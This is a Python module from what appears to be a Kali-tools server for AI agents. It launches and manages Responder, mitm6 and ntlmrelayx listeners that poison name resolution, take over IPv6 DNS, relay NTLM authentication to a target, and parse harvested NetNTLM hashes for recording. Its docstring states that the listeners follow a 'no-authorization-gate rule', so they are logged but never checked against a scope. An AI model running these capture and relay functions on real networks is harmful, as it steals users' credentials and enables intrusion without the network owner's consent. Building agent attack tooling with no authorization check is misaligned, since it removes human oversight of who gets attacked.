# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Aaron K. Clark
"""Network credential-capture listeners (Responder / mitm6 / ntlmrelayx).

These are **long-running listeners**, not one-shot scans, so they follow
the persistent-process model from :mod:`kalimcp.sessions` rather than the
:func:`kalimcp.run.run` one-shot path:

* **Responder** — poisons LLMNR / NBT-NS / mDNS to coerce hosts into
  authenticating to us, capturing NetNTLMv1/v2 hashes.
* **mitm6** — IPv6 DNS takeover (rogue DHCPv6 + DNS) to funnel a Windows
  network's name resolution through us; usually paired with ntlmrelayx.
* **impacket-ntlmrelayx** — relays captured NTLM auth to a target, or
  dumps the NetNTLM hashes it sees.

Per the no-authorization-gate rule these are **audited, not scope-gated**.
The persistent-process layer is isolated behind this module's own
:func:`_popen` factory (a private copy of the sessions.py pattern, so the
two modules never share mutable state) — the test suite patches it to
exercise the registry without spawning anything real.

Captured NetNTLM hashes surfaced by :func:`capture_poll` are credentials.
Because a listener is not an ``active_tool`` (it has no single completion
to hook), there is no autorecord: recording loot is manual — poll, then
``creds_write`` whatever hashes come back.
"""

from __future__ import annotations

import re
import shlex
import subprocess
import threading
import time
import uuid
from typing import Any

from .. import audit, run

# capture_id -> {"id", "tool", "argv", "started_at", "proc": _PersistentProc}
_captures: dict[str, dict[str, Any]] = {}

_TOOLS = ("responder", "mitm6", "ntlmrelayx")

# NetNTLMv1/v2 lines printed by Responder / ntlmrelayx look like:
#   user::DOMAIN:1122...:hash...:blob...        (NetNTLMv2)
#   user::DOMAIN:lmresp:ntresp:challenge        (NetNTLMv1)
# The discriminator is the field count after `user::DOMAIN:`.
_NETNTLM_RE = re.compile(
    r"^(?P<user>[^:\s]+)::(?P<domain>[^:\s]*):(?P<rest>[0-9A-Fa-f:]+)$",
    re.MULTILINE,
)


def _new_id() -> str:
    return f"cap-{uuid.uuid4().hex[:8]}"


def _audit(action: str, **fields: Any) -> None:
    audit.log("capture_invoke", action=action, **fields)


def _now() -> str:
    from datetime import UTC, datetime
    return datetime.now(UTC).isoformat(timespec="seconds")


# ---------- persistent process (private copy of the sessions.py pattern) ----------

def _popen(argv: list[str]) -> Any:
    """Spawn a persistent listener with pipes. Patched in tests."""
    return subprocess.Popen(  # noqa: S603 (list argv, no shell)
        argv,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=0,
        start_new_session=True,
    )


class _PersistentProc:
    """Wraps a long-lived listener: a background thread drains stdout into
    a buffer; ``read_new`` returns + clears it; ``alive`` / ``stop`` manage
    the process lifecycle. A private copy of the sessions.py class so the
    two modules don't share mutable state."""

    def __init__(self, argv: list[str]) -> None:
        self._proc = _popen(argv)
        self._buf = bytearray()
        self._lock = threading.Lock()
        self._reader = threading.Thread(target=self._drain, daemon=True)
        self._reader.start()

    def _drain(self) -> None:
        stream = self._proc.stdout
        if stream is None:
            return
        try:
            while True:
                chunk = stream.read(4096)
                if not chunk:
                    break
                with self._lock:
                    if len(self._buf) < run.MAX_OUTPUT_BYTES:
                        self._buf += chunk
        except (ValueError, OSError):
            pass

    def read_new(self) -> bytes:
        with self._lock:
            out = bytes(self._buf)
            self._buf.clear()
        return out

    def alive(self) -> bool:
        return self._proc.poll() is None

    def stop(self) -> None:
        try:
            self._proc.terminate()
        except (ProcessLookupError, OSError):
            pass


# ---------- argv builders ----------

def _build_argv(
    tool: str,
    *,
    interface: str,
    domain: str,
    relay_target: str,
    extra: str,
) -> tuple[list[str] | None, dict[str, Any] | None]:
    """Return (argv, None) or (None, error_result)."""
    if tool == "responder":
        argv = ["responder", "-I", interface, "-wd"]
    elif tool == "mitm6":
        argv = ["mitm6"] + (["-d", domain] if domain else []) + ["-i", interface]
    elif tool == "ntlmrelayx":
        if not relay_target:
            return None, run.error_result("ntlmrelayx requires relay_target")
        argv = ["impacket-ntlmrelayx", "-t", relay_target, "-smb2support"]
    else:  # pragma: no cover - guarded by caller
        return None, run.error_result(f"unknown capture tool: {tool}")

    if extra.strip():
        argv += shlex.split(extra)
    return argv, None


# ---------- public API ----------

async def capture_start(
    *,
    tool: str = "responder",
    interface: str = "eth0",
    target: str = "",
    domain: str = "",
    relay_target: str = "",
    extra: str = "",
    wait_seconds: int = 3,
) -> dict[str, Any]:
    """Start a credential-capture listener; returns its capture id.

    The listener runs in the background; this call waits ``wait_seconds``
    to collect the startup banner, then returns. Poll with
    :func:`capture_poll` to harvest captured hashes as they land.
    """
    if tool not in _TOOLS:
        return run.error_result(
            f"tool must be one of {_TOOLS}, got {tool!r}"
        )

    argv, err = _build_argv(
        tool,
        interface=interface,
        domain=domain,
        relay_target=relay_target,
        extra=extra,
    )
    if err is not None:
        _audit("capture_start_rejected", tool=tool, error=err.get("stderr"))
        return err
    assert argv is not None

    try:
        proc = _PersistentProc(argv)
    except (OSError, ValueError) as exc:
        _audit("capture_start_failed", tool=tool, argv=argv, error=str(exc))
        return {"ok": False, "error": "listener_failed", "message": str(exc)}

    cid = _new_id()
    _captures[cid] = {
        "id": cid,
        "tool": tool,
        "argv": argv,
        "target": target,
        "started_at": _now(),
        "proc": proc,
    }
    _audit("capture_start", capture_id=cid, tool=tool, interface=interface,
           target=target, relay_target=relay_target, argv=argv)

    time.sleep(max(0, min(int(wait_seconds), 60)))
    initial = proc.read_new().decode("utf-8", errors="replace")
    return {
        "ok": True,
        "capture_id": cid,
        "tool": tool,
        "initial_output": initial,
        "note": "non-blocking listener — poll capture_poll to harvest hashes.",
    }


def _parse_hashes(text: str) -> list[dict[str, str]]:
    """Pull NetNTLMv1/v2 hashes out of listener output."""
    out: list[dict[str, str]] = []
    for m in _NETNTLM_RE.finditer(text):
        rest = m.group("rest")
        # NetNTLMv2 vs v1: both look like `serverChallenge:proof:resp`, but
        # the v2 response is a long client-challenge blob (100+ hex), while
        # v1's trailing fields are fixed-width (<=48 hex). Discriminate on the
        # length of the final colon-field rather than the field count, which
        # is the same (3) for both.
        last_field = rest.rsplit(":", 1)[-1]
        ntype = "NetNTLMv2" if len(last_field) > 48 else "NetNTLMv1"
        out.append({
            "user": m.group("user"),
            "domain": m.group("domain"),
            "hash": m.group(0),
            "type": ntype,
        })
    return out


def capture_poll(capture_id: str) -> dict[str, Any]:
    """Drain new listener output and parse any captured NetNTLM hashes."""
    entry = _captures.get(capture_id)
    if not entry:
        return run.error_result(f"no such capture: {capture_id}")
    proc: _PersistentProc = entry["proc"]
    text = proc.read_new().decode("utf-8", errors="replace")
    hashes = _parse_hashes(text)
    _audit("capture_poll", capture_id=capture_id, tool=entry["tool"],
           captured=len(hashes), alive=proc.alive())
    return {
        "ok": True,
        "capture_id": capture_id,
        "captured_hashes": hashes,
        "output": text,
        "alive": proc.alive(),
    }


def capture_stop(capture_id: str) -> dict[str, Any]:
    """Terminate a capture listener and unregister it."""
    entry = _captures.pop(capture_id, None)
    if not entry:
        return {"ok": False, "error": "no_such_capture", "capture_id": capture_id}
    entry["proc"].stop()
    _audit("capture_stop", capture_id=capture_id, tool=entry["tool"])
    return {"ok": True, "capture_id": capture_id, "stopped": True}


def capture_list() -> dict[str, Any]:
    """List active capture listeners."""
    items = []
    for cid, entry in sorted(_captures.items()):
        items.append({
            "id": cid,
            "tool": entry["tool"],
            "alive": bool(entry["proc"].alive()),
        })
    return {"captures": items, "count": len(items)}


def reset_for_test() -> None:
    _captures.clear()
